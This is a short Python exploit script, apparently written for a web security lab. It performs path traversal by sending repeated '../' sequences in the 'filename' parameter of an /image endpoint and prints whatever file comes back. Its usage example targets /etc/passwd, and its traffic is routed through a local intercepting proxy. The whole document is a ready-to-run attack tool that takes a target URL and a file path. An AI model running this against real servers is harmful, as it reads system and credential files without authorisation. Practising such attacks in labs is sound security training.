import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

class PathTraversal:
    def __init__(self, url, depth=6):
        self.url = url
        self.depth = depth
        self.traversal = "../" * depth

    def exploit(self, target_file):
        path = f"/image?filename={self.traversal}{target_file.lstrip('/')}"
        r = requests.get(self.url + path, verify=False, proxies=proxies)

        if r.status_code == 200 and len(r.text) > 0:
            print(f"[+] Exploited successfully — {target_file}")
            print(r.text)
            return True
        else:
            print(f"[-] Failed for {target_file} (status: {r.status_code})")
            return False

def main():
    if len(sys.argv) < 3:
        print(f"[+] Usage : {sys.argv[0]} <url> <file>")
        print(f"[+] Example: {sys.argv[0]} http://target.com /etc/passwd")
        sys.exit(-1)

    url = sys.argv[1]
    target_file = sys.argv[2]

    pt = PathTraversal(url)
    pt.exploit(target_file)

if __name__ == "__main__":
    main()